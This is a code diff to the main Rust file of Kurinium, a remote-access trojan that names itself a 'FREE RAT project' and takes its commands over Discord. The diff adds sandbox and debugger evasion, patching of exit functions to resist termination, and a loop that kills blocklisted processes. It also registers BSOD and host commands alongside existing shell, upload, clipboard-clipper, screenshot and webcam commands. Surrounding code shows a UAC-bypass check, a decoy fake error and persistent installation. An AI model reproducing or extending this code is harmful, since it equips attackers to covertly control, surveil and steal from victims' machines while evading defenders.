@@ -1,11 +1,14 @@
+#![allow(dead_code)]
 use crate::prelude::*;
 use std::env;
-use tracing::{error, info, warn};
 use twilight_gateway::{Event, EventTypeFlags, Intents, Shard, ShardId, StreamExt};
 
 use crate::core::decoy::show_fake_error;
 use crate::core::instance::singleton_prcess;
 use crate::core::keep_active::start_keep_active;
+
+use crate::core::screenshot::send_connect_screenshots;
+use crate::system_info::{DeviceInfo, SystemInfo};
 
 // Modules
 mod command_registry;
@@ -27,12 +30,15 @@ use commands::network::*;
 use commands::system::*;
 use commands::utility::*;
 
+use crate::core::exit_patcher::safe_exit;
+
 // Register all commands
 async fn register_all_commands() -> anyhow::Result<()> {
     let registry = command_registry::get_registry();
 
     register_commands!(
         registry,
+
         // Core commands
         HelpCommand,
         PingCommand,
@@ -40,9 +46,11 @@ async fn register_all_commands() -> anyhow::Result<()> {
         ShellCommand,
         ExitCommand,
         AuthCommand,
+
         // Crypto commands
         EncryptCommand,
         DecryptCommand,
+
         // Filesystem commands
         CatCommand,
         CdCommand,
@@ -61,6 +69,7 @@ async fn register_all_commands() -> anyhow::Result<()> {
         UnzipCommand,
         UploadCommand,
         ZipCommand,
+
         // System commands
         ProcessCommand,
         MonitorCommand,
@@ -71,6 +80,9 @@ async fn register_all_commands() -> anyhow::Result<()> {
         ScreenCommand,
         CapsFlickerCommand,
         VisibleCommand,
+        HostCommand,
+        BsodCommand,
+
         // Utility commands
         ClipboardCommand,
         ClipperCommand,
@@ -80,14 +92,107 @@ async fn register_all_commands() -> anyhow::Result<()> {
         PrintCommand,
         ScreenshotCommand,
         WebcamCommand,
+
         // Network commands
         IpconfigCommand,
     )?;
 
     if Config::SHOW_CONSOLE {
-        info!("Registered {} commands", registry.command_count());
+        println!("Registered {} commands", registry.command_count());
     }
     Ok(())
+}
+
+fn run_saa() -> bool {
+    use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction, random_delay};
+
+    let config = AntiAnalysisConfig {
+        check_vm: false,
+        check_sandbox: true,
+        check_debugger: true,
+        min_uptime_seconds: 300,
+        min_ram_gb: 2,
+        min_processes: 40,
+        min_disk_gb: 50,
+        delay_range: (30, 90),
+        action: EvasionAction::DelayThenExit,
+    };
+
+    let result = run_checks(&config);
+
+    if result.is_detected() {
+        if Config::SHOW_CONSOLE {
+            println!("Anti Analysis ----------");
+            println!("  - Sandbox: {}", result.is_sandbox);
+            println!("  - Debugger: {}", result.is_debugger);
+            for reason in &result.reasons {
+                println!("  - Reason: {}", reason);
+            }
+            println!("Exiting...");
+        }
+
+        random_delay(config.delay_range);
+        safe_exit(0);
+    }
+
+    false
+}
+
+fn run_softaa() -> Option<Vec<String>> {
+    use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction};
+
+    let config = AntiAnalysisConfig {
+        check_vm: false,
+        check_sandbox: true,
+        check_debugger: true,
+        min_uptime_seconds: 120,
+        min_ram_gb: 2,
+        min_processes: 30,
+        min_disk_gb: 40,
+        delay_range: (0, 0),
+        action: EvasionAction::ReportOnly,
+    };
+
+    let result = run_checks(&config);
+
+    if result.is_detected() {
+        if Config::SHOW_CONSOLE {
+            println!("Anti Analysis ----------");
+            println!("  - Sandbox signs: {}", result.is_sandbox);
+            println!("  - Debugger signs: {}", result.is_debugger);
+            for reason in &result.reasons {
+                println!("  - Warning: {}", reason);
+            }
+            println!("Continue...");
+        }
+
+        return Some(result.reasons);
+    }
+
+    None
+}
+
+fn setup_exit_protection() -> bool {
+    use crate::core::exit_patcher;
+
+    match exit_patcher::patch_exit() {
+        true => {
+            if Config::SHOW_CONSOLE {
+                let patched = exit_patcher::get_patched_functions();
+                println!("[ExitPatcher] Successfully patched {} exit functions", patched.len());
+                for func in &patched {
+                    println!("  - {}", func);
+                }
+            }
+            true
+        }
+        false => {
+            if Config::SHOW_CONSOLE {
+                println!("[ExitPatcher] Failed to patch exit functions");
+            }
+            false
+        }
+    }
 }
 
 #[tokio::main]
@@ -95,9 +200,64 @@ async fn main() -> anyhow::Result<()> {
     let args: Vec<String> = env::args().collect();
     let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());
 
-    // Check admin status
     let mut is_admin_privileged = uac_bypass::is_admin();
     singleton_prcess(is_admin_privileged);
+
+    // ========================================================================
+    #[cfg(not(debug_assertions))]
+    {
+        if setup_exit_protection() {
+            if Config::SHOW_CONSOLE {
+                println!("[ExitPatcher] Process termination protection enabled");
+            }
+        }
+    }
+
+    #[cfg(debug_assertions)]
+    {
+        if Config::SHOW_CONSOLE {
+            println!("[ExitPatcher] Skipped (debug build)");
+        }
+    }
+
+    // ========================================================================
+    let current_exe = env::current_exe().unwrap_or_default();
+    let is_installed = installation::check_if_installed(&current_exe);
+
+    #[cfg(not(debug_assertions))]
+    {
+        if !is_installed {
+            if Config::SHOW_CONSOLE {
+                println!("[Anti-Analysis] Running checks");
+            }
+            run_saa();
+            if Config::SHOW_CONSOLE {
+                println!("[Anti-Analysis] Checks passed!");
+            }
+        } else {
+            if Config::SHOW_CONSOLE {
+                println!("[Anti-Analysis] Running checks...");
+            }
+            let warnings = run_softaa();
+            if warnings.is_some() {
+                if Config::SHOW_CONSOLE {
+                    println!("[Anti-Analysis] Warnings detected but continuing...");
+                }
+            } else {
+                if Config::SHOW_CONSOLE {
+                    println!("[Anti-Analysis] Checks passed!");
+                }
+            }
+        }
+    }
+
+    #[cfg(debug_assertions)]
+    {
+        if Config::SHOW_CONSOLE {
+            println!("[Anti-Analysis] Skipped (debug build)");
+        }
+    }
+    // ========================================================================
 
     // Show decoy message if config
     let decoy_config = Config::get_decoy_config();
@@ -138,9 +298,7 @@ async fn main() -> anyhow::Result<()> {
     }
 
     //@ Installation
-    let current_exe = env::current_exe().unwrap_or_default();
-    let is_installed = installation::check_if_installed(&current_exe);
-
+    // Note: is_installed already checked above for anti-analysis
     if is_admin_privileged && !is_installed {
         if Config::SHOW_CONSOLE {
             println!("Starting installation process...");
@@ -181,7 +339,7 @@ async fn main() -> anyhow::Result<()> {
             println!("Installation complete. Exiting original process...");
             std::thread::sleep(std::time::Duration::from_secs(2));
         }
-        std::process::exit(0);
+        safe_exit(0);
     }
 
     //@ Hide Console
@@ -212,15 +370,82 @@ async fn main() -> anyhow::Result<()> {
         match register_all_commands().await {
             Err(e) => {
                 if Config::SHOW_CONSOLE {
-                    error!("Failed to register commands: {}", e);
+                    println!("Failed to register commands: {}", e);
                 }
             }
             Ok(_) => {
                 if Config::SHOW_CONSOLE {
-                    info!("Kurinium, Is a FREE RAT project. https://github.com/Mikasuru/Kurinium");
-                    info!("All commands registered in registry");
+                    println!("Kurinium, Is a FREE RAT project. https://github.com/Mikasuru/Kurinium");
+                    println!("All commands registered in registry");
                 }
             }
+        }
+    });
+
+    //@ Blocklist Process Monitor
+    tokio::spawn(async move {
+        use sysinfo::{ProcessExt, System, SystemExt, PidExt};
+        use std::collections::HashSet;
+        use std::fs;
+        
+        fn load_blocklist() -> HashSet<String> {
+            let path = installation::get_install_path().join("blocklist.json");
+            if let Ok(content) = fs::read_to_string(&path) {
+                content.lines()
+                    .filter(|l| !l.is_empty())
+                    .map(|l| {
+                        let name = l.trim().to_lowercase();
+                        if name.ends_with(".exe") {
+                            name[..name.len()-4].to_string()
+                        } else {
+                            name
+                        }
+                    })
+                    .collect()
+            } else {
+                HashSet::new()
+            }
+        }
+
+        let mut sys = System::new_all();
+        let mut killed_pids: HashSet<u32> = HashSet::new();
+
+        loop {
+            let blocklist = load_blocklist();
+            
+            if !blocklist.is_empty() {
+                sys.refresh_processes();
+                
+                for (pid, process) in sys.processes() {
+                    let pid_u32 = pid.as_u32();
+                    
+                    if killed_pids.contains(&pid_u32) {
+                        continue;
+                    }
+                    
+                    let proc_name = process.name().to_lowercase();
+                    let proc_name_base = if proc_name.ends_with(".exe") {
+                        &proc_name[..proc_name.len()-4]
+                    } else {
+                        &proc_name
+                    };
+                
+                    if blocklist.contains(proc_name_base) {
+                        if process.kill() {
+                            killed_pids.insert(pid_u32);
+                            if Config::SHOW_CONSOLE {
+                                println!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid_u32);
+                            }
+                        }
+                    }
+                }
+                
+                sys.refresh_processes();
+                let running: HashSet<u32> = sys.processes().keys().map(|p| p.as_u32()).collect();
+                killed_pids.retain(|pid| running.contains(pid));
+            }
+            
+            tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
         }
     });
 
@@ -233,7 +458,7 @@ async fn main() -> anyhow::Result<()> {
 
     let device_channel_id = channel_manager.init_dchannel().await?;
     if Config::SHOW_CONSOLE {
-        info!("Device channel initialized: {}", device_channel_id);
+        println!("Device channel initialized: {}", device_channel_id);
     }
 
     //@ Gateway configuration
@@ -245,16 +470,16 @@ async fn main() -> anyhow::Result<()> {
         crate::core::wifi_monitor::WifiMonitor::new(http.clone(), device_channel_id, wifi_config);
     if let Err(e) = wifi_monitor.start_monitoring().await {
         if Config::SHOW_CONSOLE {
-            error!("Failed to start WiFi monitoring: {}", e);
+            println!("Failed to start WiFi monitoring: {}", e);
         }
     } else if Config::SHOW_CONSOLE && Config::get_wifi_monitor_config().enabled {
-        info!("WiFi monitoring started successfully");
+        println!("WiFi monitoring started successfully");
     }
 
     if Config::SHOW_CONSOLE {
-        info!("Prefix: {}", Config::BOT_PREFIX);
-        info!("Guild ID: {}", guild_id);
-        info!("[ Console if showing ]-----------------------------------");
+        println!("Prefix: {}", Config::BOT_PREFIX);
+        println!("Guild ID: {}", guild_id);
+        println!("[ Console is showing ]-----------------------------------");
     }
 
     //@ Event Loop With Reconnection
@@ -266,7 +491,7 @@ async fn main() -> anyhow::Result<()> {
         let mut shard = Shard::new(ShardId::new(0, 1), token.clone(), intents);
 
         if Config::SHOW_CONSOLE {
-            info!("Connecting to Discord gateway...");
+            println!("Connecting to Discord gateway...");
         }
         let mut connected_successfully = false;
 
@@ -277,13 +502,13 @@ async fn main() -> anyhow::Result<()> {
                 Some(Ok(event)) => event,
                 Some(Err(source)) => {
                     if Config::SHOW_CONSOLE {
-                        error!("Error receiving event: {:?}", source);
+                        println!("Error receiving event: {:?}", source);
                     }
                     break;
                 }
                 None => {
                     if Config::SHOW_CONSOLE {
-                        info!("Event stream ended, reconnecting...");
+                        println!("Event stream ended, reconnecting...");
                     }
                     break;
                 }
@@ -295,21 +520,21 @@ async fn main() -> anyhow::Result<()> {
                     reconnect_delay = MIN_RECONNECT_DELAY;
 
                     if Config::SHOW_CONSOLE {
-                        info!("Bot is ready!");
+                        println!("Bot is ready!");
                     }
                 }
 
                 Event::Resumed => {
                     connected_successfully = true;
                     if Config::SHOW_CONSOLE {
-                        info!("Gateway session resumed");
+                        println!("Gateway session resumed");
                     }
                 }
 
                 Event::MessageCreate(msg) => {
                     if let Err(e) = handler::handle_message(&http, msg.0, device_channel_id).await {
                         if Config::SHOW_CONSOLE {
-                            error!("Error handling message: {}", e);
+                            println!("Error handling message: {}", e);
                         }
                     }
                 }
@@ -317,7 +542,7 @@ async fn main() -> anyhow::Result<()> {
                 Event::InteractionCreate(interaction) => {
                     if let Err(e) = handler::handle_interaction(&http, interaction.0).await {
                         if Config::SHOW_CONSOLE {
-                            error!("Error handling interaction: {}", e);
+                            println!("Error handling interaction: {}", e);
                         }
                     }
                 }
@@ -325,35 +550,35 @@ async fn main() -> anyhow::Result<()> {
                 Event::GatewayClose(frame_opt) => {
                     if let Some(frame) = frame_opt {
                         if Config::SHOW_CONSOLE {
-                            info!("Gateway closed with code: {}", frame.code);
+                            println!("Gateway closed with code: {}", frame.code);
                         }
 
                         match frame.code {
                             4004 => {
-                                error!("Authentication failed: Invalid token.");
+                                println!("Authentication failed: Invalid token.");
                                 return Err(anyhow::anyhow!("Invalid token"));
                             }
                             4010 => {
-                                error!("Invalid shard");
+                                println!("Invalid shard");
                                 return Err(anyhow::anyhow!("Invalid shard"));
                             }
                             4011 => {
-                                error!("Sharding required");
+                                println!("Sharding required");
                                 return Err(anyhow::anyhow!("Bot too large, needs sharding"));
                             }
                             4013 => {
-                                error!("Invalid intents");
+                                println!("Invalid intents");
                                 return Err(anyhow::anyhow!("Invalid intents"));
                             }
                             4014 => {
-                                error!("Disallowed intents");
+                                println!("Disallowed intents");
                                 return Err(anyhow::anyhow!("Privileged intents not enabled"));
                             }
                             _ => {}
                         }
                     } else {
                         if Config::SHOW_CONSOLE {
-                            info!("Gateway closed without close frame");
+                            println!("Gateway closed without close frame");
                         }
                     }
 
@@ -362,7 +587,7 @@ async fn main() -> anyhow::Result<()> {
 
                 Event::GatewayInvalidateSession(can_resume) => {
                     if Config::SHOW_CONSOLE {
-                        info!("Session invalidated (resumable: {})", can_resume);
+                        println!("Session invalidated (resumable: {})", can_resume);
                     }
                     break;
                 }
@@ -376,7 +601,7 @@ async fn main() -> anyhow::Result<()> {
             reconnect_delay = (reconnect_delay * 2).min(MAX_RECONNECT_DELAY);
 
             if Config::SHOW_CONSOLE {
-                warn!(
+                println!(
                     "Failed to establish connection. Waiting {} seconds before retry...",
                     reconnect_delay
                 );
@@ -385,7 +610,7 @@ async fn main() -> anyhow::Result<()> {
             reconnect_delay = MIN_RECONNECT_DELAY;
 
             if Config::SHOW_CONSOLE {
-                info!(
+                println!(
                     "Disconnected. Reconnecting in {} seconds...",
                     reconnect_delay
                 );
